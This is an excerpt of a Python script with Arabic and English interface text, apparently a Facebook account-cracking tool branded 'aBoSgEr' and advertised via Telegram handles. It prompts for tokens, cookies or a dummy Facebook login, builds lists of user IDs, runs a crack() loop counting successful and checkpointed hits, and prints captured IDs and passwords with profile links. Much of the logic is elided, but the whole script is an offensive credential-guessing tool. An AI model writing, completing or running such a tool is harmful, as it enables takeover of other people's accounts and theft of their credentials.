...
logo='''\033[1;97m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\x1b[38;5;208maBoSgEr\033[1;97m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
\x1b[38;5;48m    
T_awi@ :ﻞـﺻﺍﻮتـﻠﻟ

ﻪﺒـﺤﻛ ﻦـﺑﺍ ﻚـﺳﺍﺭ ﺝﺎـﺗ ﺮـﻜـﺻ ﻮـﺑﺍ

 \033[1;97m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\x1b[38;5;208maBoSgEr\033[1;97m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬'''
...
S = '\x1b[1;33m'
print(logo)
print('\033[1;35m────────────────────────────────────────────────────────────\n\033[1;32m(\033[1;35m+\033[1;32m) \033[1;33m Telegram\033[1;35m | \033[1;32m @T_awe  \033[1;35m (\033[1;32m+\033[1;35m) \033[1;33m Telegram \033[1;35m | \033[1;32m @JJNJD \n\033[1;35m────────────────────────────────────────────────────────────')

token = input(f"{C}  Enter Token : {M} ")
print('')

ID = input(f"{C}  Enter ID : {M}  ")
pretty.install()
CON = sol()
...
class login():
	...
	def lo_epa(self):
		...
		print('')
		print(logo)
		print('يرجى تسجيل دخول بحساب فيس وهمي ')
		em = str(input(f" \x1b[38;5;208mEmail - ايميل :{SM} "))
		ps = input(f" \x1b[38;5;208mpassword - باسورد:{SM}  ")
		e="5990"
		ee="655"
		eee="59"
		...
		if 'access_token' in po:
			...
			linex()
			animation(f' {SM}GOOD Login - تم تسجيل الدخول بنجاح')
			...
			if 'www.facebook.com' in po['error_msg']:
				...
				linex()
				exit(' ERORR Login - لم يتم تسجيل الدخول')
	def login_epa2(self):
		system('clear');
		print(logo)
		cooke = input(' cookie : ')
...
class file_create_menu():
	def file_simple(self):
		...
		try:
			...
			nm  = 'BrHoM.txt'.replace(' ','_')
			lk = '/storage/emulated/0/Download/Telegram/'
			lok = '%s%s'%(lk,nm)
			open(lok,'w')
	...
	def file_unlimmited(self):
		...
		if IOError:
			...
			os.system('clear')
			print(logo)
			print('ضع ايدي فيس وانتظر قليلا......')
...
def main():
    ...
    gh = 'h'
    print(logo)
    print(f'''[\x1b[38;5;48m1\033[1;97m] - CRACK PUBLIC : ﺕﺎﻳﺪﻳﻻﺍ ﻦﻣ ﺪﻴﺻ ''')
    print(f'''[\x1b[38;5;48m2\033[1;97m] - CRACK FILE : ﻒﻠﻤﻟﺍ ﻦﻣ ﺪﻴﺻ ''')
    print(f'''[\x1b[38;5;48m3\033[1;97m] - CREAT FILE  : ﺕﺎﻳﺪﻳﺍ ﻒﻠﻣ ﻊﻨﺻ[OFF]''')
    print(f'''[\x1b[38;5;48m0\033[1;97m] - EXIT : ﺝﻭﺮﺧ ﻞﻴﺠﺴﺗ ''')
    print('━━━━━━━━━━━━━━━━━━')       
    _____alvino__adijaya_____ = input(' SELET : ')
...
def crack(idf, pwv):
    ...
    fff = '%'
    print('\r%s \033[32m[ \033[36maBoSgEr\033[32m ] %s/%s  \033[92mTure : %s  \033[33mSECURE : %s   \033[35m \033[91mBLOCK : 0 \033[35m%s%s%s' % (bi, loop, len(id2), ok, cp, int(pers), str(fff), x), end=' ')
    sys.stdout.flush()
...
- BY : @T_awi'''
                    ...
                    cetak(nel(statuscp1, title='aBoSgEr*Cp*'))
...
- BY : @T_awi'''
                    ...
                    cetak(nel(statusok1, title='aBoSgEr*Ok*'))
...
--------------------------------
  [ + ]   GMIL  : {idf}\n
  [ + ]   PASS  : {pw}\n
  [ + ] https://www.facebook.com/profile.php?id={idf}&mibextid=ZbWKwL
--------------------------------
- BY : @T_awi'''
                    statusok1 = nel(statusok, style='green')
                    cetak(nel(statusok1, title='aBoSgEr*Ok*'))
